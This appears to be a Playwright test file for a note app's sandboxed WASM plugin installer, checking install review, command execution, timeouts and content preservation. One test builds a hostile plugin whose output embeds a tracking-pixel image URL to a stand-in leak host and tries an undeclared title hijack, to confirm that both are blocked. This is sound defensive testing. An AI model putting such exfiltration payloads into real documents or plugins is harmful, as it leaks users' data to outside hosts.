import { readFileSync } from "node:fs";
import { expect, type Page, test } from "@playwright/test";
import { moduleReturningText, moduleWithImport } from "../src/core/plugins/wasmFixtures";
import { createNoteOnDesktop, openSettingsPage, startLocalVault } from "./devices";

// 試験では GitHub へつながない。リポジトリに置いてある見本のプラグイン（plugins/text-tools）を、GitHub の代わりに返す。
const COMMIT_SHA = "0123456789abcdef0123456789abcdef01234567";
const EXAMPLE_DIRECTORY = "plugins/text-tools";
const exampleManifest = readFileSync(`${EXAMPLE_DIRECTORY}/sedum-note-plugin.json`, "utf8");
const exampleModule = readFileSync(`${EXAMPLE_DIRECTORY}/text-tools.wasm`);

type PluginFiles = { manifest: string; module: Buffer | Uint8Array };

// GitHub の API（コミットの SHA）と、そのコミットのファイルを返す。届いた要求の URL を返す。
async function serveGitHub(page: Page, { manifest, module }: PluginFiles): Promise<string[]> {
  const requestedUrls: string[] = [];
  const cors = { "access-control-allow-origin": "*" };
  await page.route(/^https:\/\/(api\.github\.com|raw\.githubusercontent\.com)\//, async (route) => {
    const url = route.request().url();
    requestedUrls.push(url);
    if (route.request().method() === "OPTIONS") {
      await route.fulfill({ status: 204, headers: { ...cors, "access-control-allow-headers": "*" } });
    } else if (url.startsWith("https://api.github.com/")) {
      await route.fulfill({ headers: cors, contentType: "text/plain", body: COMMIT_SHA });
    } else if (url.endsWith("/sedum-note-plugin.json")) {
      await route.fulfill({ headers: cors, contentType: "application/json", body: manifest });
    } else {
      await route.fulfill({ headers: cors, contentType: "application/wasm", body: Buffer.from(module) });
    }
  });
  return requestedUrls;
}

async function fetchPlugin(page: Page, source: string): Promise<void> {
  await openSettingsPage(page, "プラグイン");
  await page.getByLabel("インストール元（GitHub）").fill(source);
  await page.getByRole("button", { name: "取ってくる" }).click();
}

async function runFromNoteMenu(page: Page, commandTitle: string): Promise<void> {
  await page.getByRole("button", { name: "その他の操作" }).last().click();
  await page.getByRole("menuitem", { name: commandTitle }).click();
}

test("GitHub からプラグインを取り込むと、できることを確かめてから入り、メモのメニューからコマンドを実行できる", async ({ page }) => {
  const requestedUrls = await serveGitHub(page, { manifest: exampleManifest, module: exampleModule });
  await startLocalVault(page);
  await createNoteOnDesktop(page, "買い物");
  await page.keyboard.type("みかん");
  await page.keyboard.press("Enter");
  await page.keyboard.type("りんご");
  await page.keyboard.press("Enter");
  await page.keyboard.type("ぶどう");

  await fetchPlugin(page, "aida0710/sedum-note/plugins/text-tools");
  const review = page.getByRole("dialog", { name: "プラグイン「Text tools」をインストール" });
  await expect(review).toContainText("選択した文字");
  await expect(review).toContainText("開いているメモの本文");
  await expect(review).toContainText("短い知らせを出す");
  await expect(review).toContainText(COMMIT_SHA);
  await review.getByRole("button", { name: "インストール" }).click();
  await expect(page.locator(".plugin-list li")).toContainText("Text tools");
  // ブランチの名前をコミットに直してから、そのコミットのファイルを読む。
  expect(requestedUrls).toEqual([
    "https://api.github.com/repos/aida0710/sedum-note/commits/HEAD",
    `https://raw.githubusercontent.com/aida0710/sedum-note/${COMMIT_SHA}/plugins/text-tools/sedum-note-plugin.json`,
    `https://raw.githubusercontent.com/aida0710/sedum-note/${COMMIT_SHA}/plugins/text-tools/text-tools.wasm`,
  ]);

  await page.getByRole("tab", { name: "買い物" }).click();
  await runFromNoteMenu(page, "Count characters");
  await expect(page.getByRole("status").filter({ hasText: "9 characters, 3 lines" })).toBeVisible();

  // 選択した行を並べ替える。1 回の取り消しで戻る。
  await page.locator(".ProseMirror").click();
  await page.keyboard.press("Control+a");
  await runFromNoteMenu(page, "Sort the selected lines");
  await expect(page.locator(".ProseMirror p")).toHaveText(["ぶどう", "みかん", "りんご"]);
  await page.keyboard.press("Control+z");
  await expect(page.locator(".ProseMirror p")).toHaveText(["みかん", "りんご", "ぶどう"]);

  // 切ると、メニューからコマンドが消える。
  await page.getByRole("tab", { name: "設定" }).click();
  await page.locator(".plugin-list li").getByLabel("有効").uncheck();
  await page.getByRole("tab", { name: "買い物" }).click();
  await page.getByRole("button", { name: "その他の操作" }).last().click();
  await expect(page.getByRole("menuitem", { name: "Count characters" })).toHaveCount(0);
  await page.keyboard.press("Escape");

  // 外すボタンと確認は、入れるときの言葉に合わせて「アンインストール」と呼ぶ。
  await page.getByRole("tab", { name: "設定" }).click();
  await page.locator(".plugin-list li").getByRole("button", { name: "アンインストール" }).click();
  const confirmation = page.getByRole("dialog").filter({ hasText: "プラグイン「Text tools」をアンインストールしますか？" });
  await confirmation.getByRole("button", { name: "アンインストール" }).click();
  await expect(page.locator(".plugin-list li")).toHaveCount(0);
});

test("外の関数を使おうとするプラグインは、入れられない", async ({ page }) => {
  await serveGitHub(page, { manifest: exampleManifest, module: moduleWithImport() });
  await startLocalVault(page);
  await fetchPlugin(page, "someone/plugin");
  await expect(page.getByRole("alert")).toContainText("外部の関数を使っているため、インストールできません");
  await expect(page.getByRole("dialog")).toHaveCount(0);
});

test("プラグインが外の画像や埋め込みを書いても、外へはつながらない。宣言していない書き換えは行わない", async ({ page }) => {
  // 本文に足すことだけを宣言したプラグイン。返す指示は、外の画像と、宣言していない題の書き換え。
  const manifest = JSON.stringify({ ...JSON.parse(exampleManifest), reads: ["note.body"], writes: ["note.append"], commands: [{ id: "leak", title: "Leak" }] });
  const output = JSON.stringify({ append: "![secret](https://leak.sedum-note.test/pixel.png?q=secret)\\n\\nhttps://www.youtube.com/watch?v=abcdefgh", setTitle: "乗っ取った題" });
  await serveGitHub(page, { manifest, module: moduleReturningText(output) });
  const leakedRequests: string[] = [];
  page.on("request", (request) => {
    if (/leak\\.sedum-note\\.test|youtube/.test(request.url())) {
      leakedRequests.push(request.url());
    }
  });
  await startLocalVault(page);
  await createNoteOnDesktop(page, "日記");
  await page.keyboard.type("今日のこと");
  await fetchPlugin(page, "someone/plugin");
  await page.getByRole("dialog").getByRole("button", { name: "インストール" }).click();
  await page.getByRole("tab", { name: "日記" }).click();
  await runFromNoteMenu(page, "Leak");

  // 画像は、リンクの文字として入る（読み込まない）。題は変わらない。
  await expect(page.locator(".ProseMirror a").first()).toHaveText("secret");
  await expect(page.locator(".ProseMirror img")).toHaveCount(0);
  await expect(page.locator(".ProseMirror iframe")).toHaveCount(0);
  await expect(page.getByPlaceholder("タイトル")).toHaveValue("日記");
  expect(leakedRequests).toEqual([]);
});

test("終わらないプラグインは、決めた時間で止めて知らせる。そのあとも、メモを書ける", async ({ page }) => {
  await serveGitHub(page, { manifest: exampleManifest, module: moduleReturningText("{}", { loopsOnStart: true }) });
  await startLocalVault(page);
  await createNoteOnDesktop(page, "メモ");
  await fetchPlugin(page, "someone/plugin");
  await page.getByRole("dialog").getByRole("button", { name: "インストール" }).click();
  await page.getByRole("tab", { name: "メモ" }).click();
  await runFromNoteMenu(page, "Count characters");
  await expect(page.getByRole("status").filter({ hasText: "制限時間内に終わりませんでした。" })).toBeVisible();
  await page.locator(".ProseMirror").click();
  await page.keyboard.type("まだ書ける");
  await expect(page.locator(".ProseMirror")).toHaveText("まだ書ける");
});

// 1x1 の PNG。
const TINY_PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==", "base64");

test("本文の全部を置き換えるコマンドのあとも、添付と、リンクが指しているブロックが残る。置き換える前の状態は、履歴に残る", async ({ page }) => {
  await serveGitHub(page, { manifest: exampleManifest, module: exampleModule });
  await startLocalVault(page);
  await createNoteOnDesktop(page, "計画");
  await page.keyboard.type("出発は朝");
  await page.keyboard.press("Enter");
  await page.keyboard.type("宿は駅前");
  await page.locator('input[type="file"][accept="image/*"]:not([capture])').setInputFiles({ name: "map.png", mimeType: "image/png", buffer: TINY_PNG });
  await expect(page.locator(".ProseMirror img")).toHaveCount(1);
  // 別のメモから、「宿は駅前」の段落へリンクする（その段落に、ブロックの ID が付く）。
  await createNoteOnDesktop(page, "メモ");
  await page.keyboard.type("/ぶろっく");
  await page.keyboard.press("Enter");
  await page.getByRole("dialog", { name: "ブロックのあるメモを選ぶ" }).getByRole("button", { name: "計画" }).click();
  await page.getByRole("dialog", { name: "「計画」の中のブロックを選ぶ" }).getByRole("button", { name: "宿は駅前" }).click();
  const blockLink = page.locator(".ProseMirror .note-link button");
  await expect(blockLink).toHaveText("計画 › 宿は駅前");

  await fetchPlugin(page, "aida0710/sedum-note/plugins/text-tools");
  await page.getByRole("dialog").getByRole("button", { name: "インストール" }).click();
  await page.getByRole("tab", { name: "計画" }).click();
  await runFromNoteMenu(page, "Remove trailing spaces");

  // 本文を書き直しても、写真は残り、リンクは同じ段落を指したまま。
  await expect(page.locator(".ProseMirror img")).toHaveCount(1);
  await expect(page.locator(".ProseMirror p").filter({ hasText: /\S/ })).toHaveText(["出発は朝", "宿は駅前"]);
  await page.getByRole("tab", { name: "メモ", exact: true }).click();
  await expect(blockLink).toHaveText("計画 › 宿は駅前");
  // 置き換える前の状態が、履歴に残っている。
  await page.getByRole("tab", { name: "計画" }).click();
  await runFromNoteMenu(page, "履歴");
  await expect(page.getByRole("dialog", { name: "履歴" }).getByRole("option")).toHaveCount(1);
});
